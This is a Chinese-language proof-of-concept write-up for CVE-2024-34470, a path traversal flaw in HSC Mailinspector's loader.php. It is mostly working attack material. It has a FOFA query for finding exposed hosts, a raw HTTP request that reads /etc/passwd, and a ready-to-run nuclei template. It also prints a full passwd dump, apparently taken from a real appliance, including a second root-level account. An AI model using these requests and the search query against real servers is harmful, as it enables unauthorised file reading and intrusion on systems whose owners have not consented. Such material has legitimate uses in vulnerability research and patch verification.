# CVE-2024-34470



**描述：**未经身份验证的用户可以滥用文件中存在的路径遍历漏洞。该参数无法正确筛选传递的文件和目录是否属于 webroot，从而允许攻击者读取服务器上的任意文件。`/public/loader.php``path`

**版本：**在 HSC Mailinspector 5.2.17-3 中发现，但适用于 5.2.18 之前的所有版本。

**fofa**

"mailinspector/public"

## 概念验证



通过添加到文件路径，可以遍历目录并使用读取权限读取操作系统中的任何文件：`../`

```yaml
GET /mailinspector/public/loader.php?path=../../../../../../../etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

响应内容如下

```yaml

HTTP/1.1 200 OK
Connection: close
Content-Length: 2299
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Content-Type: text/html; charset=utf-8
Date: Tue, 04 Jun 2024 02:35:59 GMT
Expires: 0
Last-Modified: Tue, 04 Jun 2024 02:35:59 GMT
Pragma: no-cache
Server: Apache
Set-Cookie: PHPSESSID=6nhso8qu3vegqmridckcd39910; path=/;HttpOnly;Secure
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
distcache:x:94:94:Distcache:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
avahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
memcached:x:101:102:Memcached daemon:/var/run/memcached:/sbin/nologin
avahi:x:70:70:Avahi daemon:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
clam:x:102:103:Clam Anti Virus Checker:/var/lib/clamav:/sbin/nologin
fsaua:x:500:500::/var/opt/f-secure/fsaua/fsaua:/sbin/nologin
esets:x:103:104::/home/esets:/bin/false
hacluster:x:498:496::/var/lib/heartbeat/cores/hacluster:/bin/bash
haproxy:x:188:188::/var/lib/haproxy:/sbin/nologin
mysql:x:499:497:MySQL server:/var/lib/mysql:/bin/bash
opendkim:x:15:498:OpenDKIM Milter:/var/run/opendkim:/sbin/nologin
sqlgrey:x:501:501::/var/sqlgrey:/bin/true
admin:x:502:502::/home/admin:/opt/hsc/appliance/bin/shell.sh
opendmarc:x:16:499:OpenDMARC Milter:/var/run/opendmarc:/sbin/nologin
postfix:x:17:16::/var/spool/postfix:/bin/true
suportehsc:x:0:0::/home/suportehsc:/bin/bash
redis:x:18:17:Redis Server:/usr/com/redis:/sbin/nologin
```

**nuclei poc**



poc文件内容如下

```yaml

id: CVE-2024-34470

info:
  name: HSC Mailinspector loader.php 任意文件读取漏洞
  author: fgz
  severity: high
  description: HSC Mailinspector是一个电子邮件检查工具 ，在HSC Mailinspector 5.2.17-3到5.2.18版本中发现了一个问题。public/loader.php文件中存在一个未经身份验证的路径遍历漏洞。path参数无法正确筛选传递的文件和目录是否为webroot的一部分，从而使攻击者能够读取服务器上的任意文件。
  metadata:
    max-request: 1
    fofa-query: body="mailinspector/public"
    verified: true
requests:
  - raw:
      - |+
        GET /mailinspector/public/loader.php?path=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'root:')"
```

